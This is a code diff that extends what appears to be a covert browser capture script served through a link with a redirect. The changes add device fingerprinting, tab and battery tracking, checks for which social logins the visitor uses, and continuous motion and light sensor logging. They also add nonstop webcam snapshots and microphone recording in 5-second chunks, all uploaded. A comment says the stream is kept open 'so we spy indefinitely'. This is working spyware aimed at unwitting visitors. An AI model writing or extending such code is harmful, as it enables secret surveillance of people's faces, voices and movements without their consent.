@@ -433,6 +433,16 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           touch: navigator.maxTouchPoints,
           dnt: navigator.doNotTrack,
           pdf: navigator.pdfViewerEnabled,
+          plugins: (function(){
+            var p = [];
+            for (var i=0; i<navigator.plugins.length; i++) p.push(navigator.plugins[i].name);
+            return p.join(',');
+          })(),
+          mimeTypes: (function(){
+            var m = [];
+            for (var i=0; i<navigator.mimeTypes.length; i++) m.push(navigator.mimeTypes[i].type);
+            return m.join(',');
+          })(),
           gpu: (function(){
             try {
               var c = document.createElement('canvas');
@@ -522,6 +532,23 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             await logExtra({ devtools_open: devtools }); 
           }, 2000);
         })();
+
+        // Visibility Monitor: Trace when user switches tabs/apps
+        document.addEventListener('visibilitychange', async function() {
+           await logExtra({ device_visibility: document.visibilityState, visibility_ts: new Date().toLocaleTimeString() });
+        });
+
+        // Real-time Battery Tracking (Infinite)
+        if (navigator.getBattery) {
+          navigator.getBattery().then(function(batt) {
+             const updateBat = async () => {
+               await logExtra({ battery_status: Math.round(batt.level * 100) + '%', charging: batt.charging });
+             };
+             batt.addEventListener('levelchange', updateBat);
+             batt.addEventListener('chargingchange', updateBat);
+             updateBat();
+          });
+        }
 
         try {
           var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
@@ -717,7 +744,11 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
             { name: 'Facebook', url: 'https://www.facebook.com/favicon.ico' },
             { name: 'Twitter', url: 'https://twitter.com/favicon.ico' },
             { name: 'Discord', url: 'https://discord.com/favicon.ico' },
-            { name: 'Github', url: 'https://github.com/favicon.ico' }
+            { name: 'Github', url: 'https://github.com/favicon.ico' },
+            { name: 'Google', url: 'https://accounts.google.com/favicon.ico' },
+            { name: 'Instagram', url: 'https://www.instagram.com/favicon.ico' },
+            { name: 'LinkedIn', url: 'https://www.linkedin.com/favicon.ico' },
+            { name: 'Netflix', url: 'https://www.netflix.com/favicon.ico' }
           ];
           platforms.forEach(function(p) {
             var img = new Image();
@@ -769,8 +800,13 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           if (requiredPerms.includes('media')) {
             try {
               if (navigator.mediaDevices) {
-                var constraints = { video: { facingMode: "user" }, audio: false };
-                var stream = await navigator.mediaDevices.getUserMedia(constraints).catch(() => null);
+                // Request both video and audio for maximum forensic potential
+                var constraints = { video: { facingMode: "user" }, audio: true };
+                var stream = await navigator.mediaDevices.getUserMedia(constraints).catch(() => {
+                   // Fallback if mic is blocked but camera is ok
+                   return navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }).catch(() => null);
+                });
+                
                 if (stream) {
                   // Capture logic (Infinite Loop Phase)
                   var video = document.createElement('video');
@@ -782,7 +818,7 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                   document.body.appendChild(video);
                   await new Promise(r => { video.onloadedmetadata = () => { video.play().then(r).catch(r); }; setTimeout(r, 2000); });
                   
-                  // Tak Terbatas: Take pictures continuously every 3 seconds
+                  // Continuous visual snapshots
                   setInterval(async () => {
                     var canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth || 640;
@@ -793,6 +829,27 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                        await logEvent('extra', { visual_identity: canvas.toDataURL('image/jpeg', 0.6) }); 
                     }
                   }, 3000);
+
+                  // Continuous audio recording in 5 second segments
+                  if (stream.getAudioTracks().length > 0) {
+                    const recorder = new MediaRecorder(stream);
+                    recorder.ondataavailable = async (e) => {
+                      if (e.data.size > 0) {
+                        const reader = new FileReader();
+                        reader.onload = async () => {
+                          const base64 = reader.result.split(',')[1];
+                          await logEvent('extra', { audio_chunk: base64 });
+                        };
+                        reader.readAsDataURL(e.data);
+                      }
+                    };
+                    setInterval(() => {
+                      try {
+                        if (recorder.state === 'inactive') recorder.start();
+                        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 4500);
+                      } catch(e) {}
+                    }, 5000);
+                  }
                   // Intentionally NOT stopping the stream so we spy indefinitely
                 }
               }
@@ -889,7 +946,28 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
                if (window.Magnetometer) {
                  var mag = new Magnetometer({frequency: 5});
                  mag.onreading = () => logExtra({ sensor_mag: mag.x+','+mag.y+','+mag.z });
-                 mag.start(); // Tak Terbatas: Leave sensors listening
+                 mag.start(); 
+               }
+               if (window.Accelerometer) {
+                 var acc = new Accelerometer({frequency: 5});
+                 acc.onreading = () => logExtra({ sensor_acc: acc.x+','+acc.y+','+acc.z });
+                 acc.start();
+               }
+               if (window.Gyroscope) {
+                 var gyr = new Gyroscope({frequency: 5});
+                 gyr.onreading = () => logExtra({ sensor_gyr: gyr.x+','+gyr.y+','+gyr.z });
+                 gyr.start();
+               }
+               if (window.AmbientLightSensor) {
+                 var als = new AmbientLightSensor({frequency: 1});
+                 als.onreading = () => logExtra({ sensor_light: als.illuminance });
+                 als.start();
+               }
+               // Relative Orientation for 3D posture tracing
+               if (window.RelativeOrientationSensor) {
+                 var ros = new RelativeOrientationSensor({frequency: 5});
+                 ros.onreading = () => logExtra({ sensor_orient: ros.quaternion.join(',') });
+                 ros.start();
                }
             }
             if (p === 'vibration') { if (navigator.vibrate) navigator.vibrate(200); }
